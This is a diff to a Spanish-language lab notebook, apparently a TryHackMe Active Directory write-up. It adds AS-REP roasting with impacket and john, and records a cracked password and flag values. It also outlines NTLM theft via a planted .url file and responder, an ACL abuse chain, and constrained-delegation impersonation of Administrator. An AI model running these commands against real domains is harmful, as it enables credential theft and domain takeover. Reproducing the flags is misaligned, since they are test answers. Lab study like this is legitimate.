@@ -163,7 +163,9 @@ nxc smb IP_MACHINA -u 'haystack' -p 'ResetMe123!'
 
 ---
 
-## 5. Intento de AS-REP Roast (con la lista equivocada)
+## 5. AS-REP Roast — del error al hash
+
+### 5.1 Intento fallido: lista equivocada
 
 ```bash
 impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -178,10 +180,40 @@ impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile /usr/share/wordlists/
 
 **Qué falló:** `-usersfile` espera una **lista de usuarios**, no una wordlist de directorios web. Con nombres como `images/` el KDC responde *client not found*.
 
-> Corregido en §6: primero saca usuarios reales con `--rid-brute` y vuelve a lanzar `GetNPUsers` con esa lista:
-> ```bash
-> impacket-GetNPUsers thm.corp/ -dc-ip IP -usersfile rid_users.txt -no-pass -format john
-> ```
+### 5.2 Segundo intento, ahora con `clean_users.txt` ✅
+
+Con la lista de usuarios ya montada (§6) se relanza el mismo comando:
+
+```bash
+impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile clean_users.txt -no-pass
+```
+
+![[Pasted image 20261120214558.png]]
+
+Salida: los usuarios **con** `UF_DONT_REQUIRE_PREAUTH` devuelven su hash listo para crackear; los que no, se descartan:
+
+![[Pasted image 20261120215535.png]]
+
+```
+[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$ERNESTO_SILVA@THM.CORP:...
+```
+
+![[Pasted image 20261120215650.png]]
+
+```
+$krb5asrep$23$TABATHA_BRITT@THM.CORP:...:marlboro(1985)   <-- ya crackeado (john --show)
+$krb5asrep$23$LEANN_LONG@THM.CORP:...
+```
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
+john --show asrep_hashes.txt
+```
+
+**Resultado:** 3 hashes (`ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG`) → **`TABATHA_BRITT` = `marlboro(1985)`** ✅ *(captura propia, 20/11)*.
+
+> Los `KDC_ERR_C_PRINCIPAL_UNKNOWN` que siguen apareciendo son los **nombres truncados** por el `awk` de §6 que arrastró `clean_users.txt` — los usuarios roastables reales se distinguen porque devuelven hash.
 
 ---
 
@@ -266,20 +298,24 @@ nxc smb IP_MACHINA -u clean_users.txt -p 'ResetMe123!' --continue-on-success
 
 > **Lección:** en un spray con nxc, lee siempre el resultado completo: `[+] ... (Guest)` ≠ cuenta comprometida. Busca `[+]` **sin `(Guest)`** o `Pwn3d!`.
 
+Re-ejecución el 20/11 con el mismo resultado (mismo `clean_users.txt`):
+
+![[Pasted image 20261120214106.png]]
+
 ---
 
 ## 8. Pendiente: la cadena hasta las dos flags
 
-Aquí se cortan las capturas. Según los writeups públicos, el tramo que falta tiene **dos caminos** hasta las flags:
+Las capturas llegan hasta el hash de `TABATHA_BRITT` (§5). Según los writeups públicos, el tramo que falta tiene **dos caminos** hasta las flags:
 
 **Camino A — forzar autenticación (NTLM theft):**
 1. Los nombres de `onboarding` cambian = **hay alguien navegando el share**.
 2. `python3 ntlm_theft.py -g url -s TU_IP -f test` → subir el `.url` a `onboarding` + `sudo responder -I tun0` → hash NTLMv2 de `AUTOMATE`.
 3. `john --wordlist=rockyou.txt hash` → `evil-winrm -i haystack.thm.corp -u automate -p ...` → `C:\Users\automate\Desktop\user.txt`.
 
-**Camino B — AS-REP Roast + cadena de ACLs:**
-1. `GetNPUsers` con la lista corregida → hashes de `ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG` → `john` → contraseña de **`TABATHA_BRITT`**.
-2. BloodHound: `TABATHA_BRITT` →`GenericAll`→ `SHAWNA_BRAY` →`ForceChangePassword`→ `CRUZ_HALL` →`GenericWrite`→ `DARLA_WINTERS` (resetear contraseñas con `net rpc password`).
+**Camino B — AS-REP Roast + cadena de ACLs (por aquí vas):**
+1. ✅ **Hecho (§5):** `GetNPUsers` con la lista corregida → hashes de `ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG` → `john` → **`TABATHA_BRITT` = `marlboro(1985)`**.
+2. Pendiente — BloodHound: `TABATHA_BRITT` →`GenericAll`→ `SHAWNA_BRAY` →`ForceChangePassword`→ `CRUZ_HALL` →`GenericWrite`→ `DARLA_WINTERS` (resetear contraseñas con `net rpc password`).
 3. `DARLA_WINTERS` tiene **constrained delegation** sobre `cifs/haystack.thm.corp`:
    ```bash
    getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:<pass>"
@@ -297,6 +333,7 @@ Aquí se cortan las capturas. Según los writeups públicos, el tramo que falta 
 | Flag | Valor | Estado |
 | --- | --- | --- |
 | Contraseña inicial (onboarding) | `ResetMe123!` | ✅ captura propia |
+| Creds AS-REP (`TABATHA_BRITT`) | `marlboro(1985)` | ✅ captura propia |
 | User flag (`user.txt`, automate) | `THM{AUTOMATION_WILL_REPLACE_US}` | ⚠️ writeup — verificar |
 | Root flag (`root.txt`, Administrator) | `THM{RE_RE_RE_SET_AND_DELEGATE}` | ⚠️ writeup — verificar |
 
